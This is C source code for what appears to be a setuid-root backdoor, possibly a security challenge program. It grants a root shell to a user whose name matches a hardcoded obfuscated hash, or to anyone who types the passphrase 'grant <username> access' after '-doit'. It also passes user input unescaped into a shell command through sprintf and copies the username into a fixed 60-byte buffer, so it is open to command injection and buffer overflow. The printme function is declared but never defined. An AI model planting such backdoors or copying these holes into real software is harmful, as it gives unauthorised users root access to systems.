#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <pwd.h>



const char* myshell(void);
char* mycrypt(const char* input);
void printme(void);
char char_range(int i);
int goodguy(int argc, char** argv);

const char* shells[] =
  {
    "/bin/bash",
    "/usr/bin/bash",
    "/bin/sh",
    "/usr/bin/sh",
  };


#define n_shells (sizeof (shells) / sizeof (const char *))

int main (int argc, char** argv)
{
    char* shell;
    char* commandline;
    char cmd[1000];

    cmd[0] = 0;
    commandline = NULL;

    if (argc == 2) {
        if (strcmp(argv[1], "-code") == 0) {
            printme();
            return 0;
        }
        else if (strcmp(argv[1], "-doit") == 0) {
        }
        else {
            commandline = argv[1];
        }
    }

    if (goodguy(argc, argv)) {
        setuid(0);
        setgid(0);
        shell = (char*) myshell();
        if (shell != NULL) {
            if (commandline != NULL) {
                sprintf(cmd, "%s -c '%s'", shell, commandline);
                system(cmd);
            }
            else {
                system(shell);
            }
        }
    }
    return 0;
}

int goodguy(int argc, char** argv)
{
    char codeword[60];
    char* gotten_pass;
    char* enc;
    uid_t id;
    struct passwd *pwd;

    
    id = getuid();
    pwd = getpwuid(id);

    enc  = mycrypt(pwd->pw_name);
    if (strcmp("'_d,nm#ed |d#ed,nm'_d" , enc) == 0) {
        return 1;
    }
    if (argc != 2) {
        return 0;
    }
    if (strcmp(argv[1], "-doit") != 0) {
        return 0;
    }
    strcpy(codeword, "grant ");
    strcat(codeword, pwd->pw_name);
    strcat(codeword, " access");
    gotten_pass = getpass("");
    if (strcmp(gotten_pass, codeword) == 0) {
        return 1;
    }
    return 0;
}

char* mycrypt(const char* input)
{
    int len;
    char* str2;
    int i,j;

    len = strlen(input);
    str2 = (char*)malloc(len*3+1);
    j = 0;
    for (i=0; i<len; i++) {
        str2[j++] = char_range(input[i] - input[len - 1 - i]);
        str2[j++] = char_range(input[i] + input[len - 1 - i]);
        str2[j++] = char_range(input[i] * input[len - 1 - i]);
    }
    str2[j] = 0;
    return str2;
}

char char_range(int i)
{
    i = abs(i);
    while (i<32) {
        i+=32;
    }
    while (126<i) {
        i-=32;
    }
    return i;
}

const char* myshell(void)
{
    int i;
    for (i=0; i<n_shells; i++) {
        if (access(shells[i], F_OK) != -1) {
            return shells[i];
        }
    } 
    return (char*) NULL;
}
